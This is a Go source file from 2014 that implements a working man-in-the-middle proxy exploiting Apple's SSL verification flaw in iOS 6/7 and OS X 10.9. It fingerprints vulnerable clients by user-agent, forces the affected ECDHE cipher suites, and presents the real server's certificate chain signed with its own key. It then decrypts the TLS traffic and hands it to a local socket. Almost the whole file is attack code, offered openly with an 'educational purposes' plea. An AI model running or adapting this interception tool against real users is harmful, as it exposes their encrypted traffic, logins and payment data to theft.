// This is some example code to demonstrate the SSL verification flaw in iOS
// and Mac OS X, documented at:
//
//   http://support.apple.com/kb/HT6147
//   https://www.imperialviolet.org/2014/02/22/applebug.html
//
// It implements a (flaky) HTTP & HTTPS proxy that will hijack requests from
// known vulnerable clients, and instead redirect the request to whatever
// happens to be listening on the supplied UNIX domain socket.
//
// This is a worthless plea on the internet, but please at least make a cursory
// attempt at refraining from being a shitbird with this code. It's for
// educational purposes, not for stealing mom's credit card number.
//
// This is free and unencumbered software released into the public domain.
//
// Gabriel Gironda, 2014
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"flag"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

const (
	RSAKeyLength = 2048
)

var (
	AffectedIOSVersionMatch = regexp.MustCompile(`[67]_0_[0-5] like Mac OS X`)
	AffectedOSXVersionMatch = regexp.MustCompile(`Mac OS X 10_9`)
	VulnerableCipherSuites  = []uint16{
		tls.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
		tls.TLS_ECDHE_RSA_WITH_RC4_128_SHA,
		tls.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,
		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
		tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	}
)

type InterceptingProxyHandler struct {
	SocketPath string
	ListenHost string
	ListenPort int
	privateKey *rsa.PrivateKey
}

func main() {
	listenPort := flag.Int("port", 8080, "listen port")
	listenHost := flag.String("host", "", "listen host")
	socketPath := flag.String("socket", "", "socket path")

	flag.Parse()

	if *socketPath == "" {
		tempPath := filepath.Join(os.TempDir(), "apple-ssl.sock")
		socketPath = &tempPath
	}

	proxy := &InterceptingProxyHandler{
		ListenHost: *listenHost,
		ListenPort: *listenPort,
		SocketPath: *socketPath,
	}

	err := proxy.Listen()

	if err != nil {
		log.Fatal("ListenAndServe: ", err)
		os.Exit(1)
	}
}

// Listen for incoming proxy connections.
func (p *InterceptingProxyHandler) Listen() error {
	listenAddr := net.JoinHostPort(p.ListenHost, strconv.Itoa(p.ListenPort))
	rsaKey, err := rsa.GenerateKey(rand.Reader, RSAKeyLength)

	if err != nil {
		return err
	}

	p.privateKey = rsaKey

	log.Println("intercept socket at", p.SocketPath)
	log.Println("listening on", listenAddr)

	return http.ListenAndServe(listenAddr, p)
}

func (p *InterceptingProxyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Println("received request:", r)

	switch r.Method {
	case "CONNECT":
		p.proxyConnectRequest(w, r)
	default:
		p.proxyPlaintextRequest(w, r)
	}
}

func (p *InterceptingProxyHandler) proxyConnectRequest(w http.ResponseWriter, r *http.Request) {
	if p.canInterceptRequest(r) {
		p.interceptRequest(w, r)
	} else {
		p.doConnectRequest(w, r)
	}
}

// Proxies a plaintext request, returning the response to the client.
func (p *InterceptingProxyHandler) proxyPlaintextRequest(w http.ResponseWriter, r *http.Request) {
	requestHost := r.URL.Host

	if !strings.ContainsAny(requestHost, ":") {
		requestHost = requestHost + ":80"
	}

	conn, err := net.Dial("tcp", requestHost)

	if err != nil {
		log.Println("bad request (dial):", err)
		http.Error(w, "Bad proxy request", http.StatusInternalServerError)
		return
	}

	clientConn := httputil.NewClientConn(conn, nil)
	response, err := clientConn.Do(r)

	if err != nil && err != httputil.ErrPersistEOF {
		log.Println("bad request:", err)
		http.Error(w, "Bad proxy request", http.StatusInternalServerError)
		return
	}

	for k, v := range response.Header {
		w.Header()[k] = v
	}

	io.Copy(w, response.Body)
}

// Indicates whether or not the client's connection can be hijacked, based on
// the given user agent.
func (p *InterceptingProxyHandler) canInterceptRequest(r *http.Request) bool {
	ua := r.Header.Get("User-Agent")
	if !strings.Contains(ua, "AppleWebKit") {
		return false
	}

	return AffectedIOSVersionMatch.MatchString(ua) || AffectedOSXVersionMatch.MatchString(ua)
}

// Proxies a raw connection to a remote server.
func (p *InterceptingProxyHandler) doConnectRequest(w http.ResponseWriter, r *http.Request) {
	log.Println("performing regular CONNECT request")

	w.WriteHeader(http.StatusOK)

	hijackedConnection, _, err := w.(http.Hijacker).Hijack()
	if err != nil {
		log.Println("error hijacking conncetion", err)
		return
	}

	remoteConnection, err := net.Dial("tcp", r.URL.Host)
	if err != nil {
		log.Println("error dialing remote", err)
		return
	}

	go io.Copy(hijackedConnection, remoteConnection)
	go io.Copy(remoteConnection, hijackedConnection)
}

// Intercepts an SSL connection to a remote server. The request will instead be
// redirected to the socket configured at p.SocketPath.
//
// SSL Added and removed here! :-)
func (p *InterceptingProxyHandler) interceptRequest(w http.ResponseWriter, r *http.Request) {
	log.Println("hijacking TLS connection")

	tlsConn, err := tls.Dial("tcp", r.URL.Host, nil)
	defer tlsConn.Close()

	if err != nil {
		log.Println("error dialing TLS, falling back:", err)
		p.doConnectRequest(w, r)
		return
	}

	cs := tlsConn.ConnectionState()
	peerCerts := cs.PeerCertificates

	fakedCert := tls.Certificate{}
	fakedCert.PrivateKey = p.privateKey

	for _, peerCert := range peerCerts {
		fakedCert.Certificate = append(fakedCert.Certificate, peerCert.Raw)
	}

	host, _, _ := net.SplitHostPort(r.URL.Host)

	config := &tls.Config{
		Certificates:             []tls.Certificate{fakedCert},
		ServerName:               host,
		PreferServerCipherSuites: true,
		CipherSuites:             VulnerableCipherSuites,
		MaxVersion:               tls.VersionTLS11,
	}

	w.WriteHeader(http.StatusOK)

	hijackedConnection, _, err := w.(http.Hijacker).Hijack()
	if err != nil {
		log.Println("error hijacking connection", err)
		return
	}

	serverConn := tls.Server(hijackedConnection, config)

	if err := serverConn.Handshake(); err != nil {
		log.Println("error during handshake:", err)
		return
	}

	interceptorConn, err := net.Dial("unix", p.SocketPath)

	if err != nil {
		log.Println("error dialing socket:", err)
		return
	}

	go io.Copy(serverConn, interceptorConn)
	go io.Copy(interceptorConn, serverConn)
}
